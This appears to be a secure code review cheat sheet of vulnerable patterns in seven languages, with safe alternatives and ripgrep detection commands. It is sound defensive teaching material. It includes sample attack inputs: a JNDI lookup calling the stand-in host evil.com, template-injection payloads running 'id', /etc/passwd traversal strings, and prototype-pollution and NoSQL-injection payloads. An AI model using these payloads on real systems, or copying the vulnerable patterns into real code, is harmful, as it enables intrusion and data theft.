# 🔤 LANGUAGE-SPECIFIC VULNERABILITY PATTERNS
# Deep-dive patterns that generic scanners miss

---

## PYTHON

### Critical Patterns
```python
# Deserialization RCE
pickle.loads(user_data)           # CWE-502: arbitrary code execution
yaml.load(user_data)              # Use yaml.safe_load()
marshal.loads(user_data)          # Never on untrusted data
shelve.open(user_controlled_path) # Pickle-based, same risk

# Code Execution
eval(user_input)                  # CWE-95
exec(user_input)                  # CWE-95
compile(user_input, ...)          # CWE-95
__import__(user_input)            # CWE-502
getattr(obj, user_input)          # Attribute access control bypass
globals()[user_input]             # Global namespace manipulation

# Format String Injection
f"Hello {user_input}"             # Safe (Python f-strings)
"Hello {}".format(user_input)     # DANGEROUS if user controls format string
"Hello %s" % user_input           # Safe for simple %s
"{0.__class__}".format(user_obj)  # Object attribute leak via format

# Path Traversal
open(os.path.join(base, user_input))  # ../../etc/passwd
# Must: os.path.realpath() then check startswith(base_dir)

# Command Injection
os.system(f"convert {filename}")      # CWE-78
subprocess.call(cmd, shell=True)      # CWE-78
subprocess.Popen(user_cmd, shell=True)
# Safe: subprocess.run([cmd, arg], shell=False)

# SQL Injection
cursor.execute(f"SELECT * FROM users WHERE id={uid}")
cursor.execute("SELECT * FROM users WHERE id=%s" % uid)
# Safe: cursor.execute("SELECT ... WHERE id=%s", (uid,))

# SSRF via libraries
requests.get(user_url)            # Validate URL first
urllib.request.urlopen(user_url)  # Check for internal IPs
httpx.get(user_url)               # Same risk

# Django-Specific
|safe filter in templates          # XSS if user-controlled
mark_safe(user_input)              # XSS
extra() and raw() in QuerySets     # SQL injection
ALLOWED_HOSTS = ['*']              # Host header injection
DEBUG = True in production         # Information disclosure
```

### Grep Commands
```bash
rg -n "pickle\.(loads|load)|yaml\.load[^s]|marshal\.loads" --type py
rg -n "eval\(|exec\(|compile\(|__import__\(" --type py
rg -n "os\.system|subprocess\.(call|run|Popen).*shell\s*=\s*True" --type py
rg -n "\.format\(.*request|f['\"].*request\." --type py
rg -n "mark_safe|\.extra\(|\|safe" --type py
rg -n "ALLOWED_HOSTS.*\*|DEBUG\s*=\s*True" --type py
```

---

## GO

### Critical Patterns
```go
// SQL Injection
db.Query(fmt.Sprintf("SELECT * FROM users WHERE id='%s'", id))
// Safe: db.Query("SELECT * FROM users WHERE id=$1", id)

// Command Injection
exec.Command("sh", "-c", userInput)    // CWE-78
exec.Command(userInput)                 // CWE-78
// Safe: exec.Command("ls", "-la", safeArg)  // No shell

// Path Traversal
http.ServeFile(w, r, filepath.Join(base, r.URL.Path))
// Must: filepath.Clean() then validate prefix

// Race Conditions (Go-specific)
// Shared map without mutex (fatal: concurrent map writes)
var cache map[string]string  // Accessed from multiple goroutines
// Must use sync.RWMutex or sync.Map

// Integer Overflow
var x int32 = math.MaxInt32
x++  // Wraps to negative, silent in Go

// Defer misuse
for _, file := range files {
    f, _ := os.Open(file)
    defer f.Close()  // All defers run at function end, not loop end = resource leak
}

// Error swallowing
result, _ := dangerousOperation()  // Error ignored!

// Unsafe pointer
import "unsafe"
ptr := unsafe.Pointer(&x)  // Bypasses type safety

// HTTP response not returning after error
func handler(w http.ResponseWriter, r *http.Request) {
    if !authorized(r) {
        http.Error(w, "Forbidden", 403)
        // Missing return! Code continues executing below
    }
    // Sensitive operation happens even if unauthorized
}

// Template injection
template.HTML(userInput)  // Bypasses Go's auto-escaping
```

### Grep Commands
```bash
rg -n 'fmt\.Sprintf.*SELECT|fmt\.Sprintf.*INSERT|fmt\.Sprintf.*UPDATE|fmt\.Sprintf.*DELETE' --type go
rg -n 'exec\.Command.*sh.*-c|exec\.Command\(.*\+' --type go
rg -n 'unsafe\.Pointer|import "unsafe"' --type go
rg -n ', _\s*:?=' --type go  # Ignored errors
rg -n 'template\.HTML\(' --type go
rg -n 'http\.Error.*\n[^r]' --type go  # Missing return after error
```

---

## JAVASCRIPT / TYPESCRIPT

### Critical Patterns
```javascript
// Prototype Pollution
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key];  // __proto__ pollution!
    }
}
// Payload: {"__proto__": {"isAdmin": true}}
Object.assign({}, userInput)  // Also vulnerable

// eval and friends
eval(userInput)                    // CWE-95
new Function(userInput)            // CWE-95
setTimeout(userInput, 0)           // String form = eval
setInterval(userInput, 1000)       // String form = eval
require(userInput)                 // Module injection

// DOM XSS
element.innerHTML = userInput      // CWE-79
document.write(userInput)          // CWE-79
$(selector).html(userInput)        // jQuery XSS
dangerouslySetInnerHTML={{__html: userInput}}  // React XSS

// RegExp DoS (ReDoS)
new RegExp(userInput)              // Crafted regex = CPU bomb
/^(a+)+$/.test(userInput)          // Catastrophic backtracking

// Path Traversal (Node.js)
fs.readFile(path.join(base, userInput))  // ../../etc/passwd
// Must: path.resolve() then check startsWith(base)

// Command Injection (Node.js)
child_process.exec(`ls ${userInput}`)     // CWE-78
// Safe: child_process.execFile('ls', [userInput])

// NoSQL Injection (MongoDB)
db.users.find({username: req.body.username})
// Payload: {"username": {"$gt": ""}}  → returns all users

// Type Coercion Abuse
if (userInput == "admin") {}   // "0" == false, null == undefined
// Must use ===

// Express.js specific
app.use(cors())                     // CORS wildcard = dangerous
app.use(express.json({limit:'50mb'}))  // DoS via large payloads
res.redirect(req.query.url)         // Open redirect
```

### Grep Commands
```bash
rg -n 'eval\(|new Function\(|setTimeout\([^,]*["\x27]' --type js --type ts
rg -n 'innerHTML|document\.write|\.html\(|dangerouslySetInnerHTML' --type js --type ts --type jsx
rg -n '__proto__|prototype\[' --type js --type ts
rg -n 'child_process\.exec[^F]' --type js --type ts
rg -n '\$gt|\$ne|\$regex|\$where' --type js --type ts
rg -n 'new RegExp\(.*req\.' --type js --type ts
rg -n '==[^=]' --type js --type ts  # Loose equality
```

---

## JAVA

### Critical Patterns
```java
// Deserialization (Gadget Chains)
ObjectInputStream ois = new ObjectInputStream(userStream);
Object obj = ois.readObject();  // CWE-502: RCE via gadget chain

// XML External Entity (XXE)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Missing: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// JNDI Injection (Log4Shell pattern)
logger.info("User: " + userInput);  // If userInput = "${jndi:ldap://evil.com/a}"

// SQL Injection
String query = "SELECT * FROM users WHERE id='" + userId + "'";
stmt.executeQuery(query);
// HQL also vulnerable:
session.createQuery("FROM User WHERE name='" + userName + "'");

// Reflection Abuse
Class.forName(userInput).newInstance();
Method m = obj.getClass().getMethod(userInput);

// Server-Side Template Injection
// Velocity: #set($x=$runtime.exec('id'))
// Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Path Traversal
new File(baseDir, userInput);  // ../../etc/passwd
// Must: canonical path then validate prefix

// Spring-Specific
@RequestMapping(value="/admin")  // Missing method restriction = all HTTP methods
@CrossOrigin(origins="*")        // CORS wildcard
```

### Grep Commands
```bash
rg -n 'ObjectInputStream|readObject\(\)|XMLDecoder' --type java
rg -n 'DocumentBuilderFactory|SAXParserFactory|XMLReader' --type java
rg -n 'Class\.forName\(.*\+|\.getMethod\(.*\+' --type java
rg -n 'createQuery\(.*\+|executeQuery\(.*\+' --type java
rg -n '@CrossOrigin.*\*|@RequestMapping[^(]*\)' --type java
```

---

## PHP

### Critical Patterns
```php
// Type Juggling (PHP-specific nightmare)
if ($password == "0e123456") {}  // "0e..." == 0 == false in PHP
if (md5($input) == "0e...") {}   // Magic hashes bypass
// Must use === for all comparisons

// Code Execution
eval($userInput);           // CWE-95
assert($userInput);         // Code execution in PHP < 8
preg_replace('/.*/e', $userInput, '');  // /e modifier = eval
system($userInput);
exec($userInput);
passthru($userInput);
shell_exec($userInput);
`$userInput`;  // Backtick = shell_exec

// File Inclusion (LFI/RFI)
include($userInput);        // CWE-98
require($userInput);
include_once($userInput);

// Object Injection
unserialize($userInput);    // CWE-502: triggers __wakeup, __destruct

// SQL Injection
$query = "SELECT * FROM users WHERE id=$_GET[id]";

// XSS
echo $_GET['name'];         // No htmlspecialchars()

// File Upload
move_uploaded_file($_FILES['file']['tmp_name'], $target);
// Check: file type validation, extension whitelist, not in webroot
```

---

## RUBY

### Critical Patterns
```ruby
# Mass Assignment (Rails)
User.new(params[:user])          # All params accepted
# Must: strong parameters → params.require(:user).permit(:name, :email)

# Command Injection
system("ls #{user_input}")       # CWE-78
`ls #{user_input}`               # Backtick execution
%x(ls #{user_input})             # Same
IO.popen("cmd #{user_input}")

# Unsafe YAML
YAML.load(user_data)             # CWE-502: arbitrary object instantiation
# Must: YAML.safe_load()

# ERB Injection
ERB.new(user_input).result       # Server-side template injection

# send/public_send
obj.send(user_input, args)       # Call any method including private

# Open Redirect
redirect_to params[:url]         # Unvalidated redirect

# SQL Injection
User.where("name = '#{params[:name]}'")
# Safe: User.where(name: params[:name])
```

---

## RUST

### Critical Patterns
```rust
// Unsafe blocks (bypass all safety guarantees)
unsafe {
    // Raw pointer dereference, FFI calls, mutable statics
}

// Integer overflow (wraps in release mode!)
let x: u8 = 255;
let y = x + 1;  // Panics in debug, wraps to 0 in release

// FFI boundary (no safety guarantees from C code)
extern "C" {
    fn dangerous_c_function(ptr: *const u8);
}

// Unchecked unwrap (panic = DoS)
let value = some_option.unwrap();  // Panics if None
let result = some_result.unwrap(); // Panics if Err

// SQL via string formatting (even in Rust)
let query = format!("SELECT * FROM users WHERE id={}", user_id);
```

### Grep Commands
```bash
rg -n 'unsafe\s*\{' --type rust
rg -n '\.unwrap\(\)' --type rust
rg -n 'format!\(.*SELECT|format!\(.*INSERT' --type rust
rg -n 'extern "C"' --type rust
```
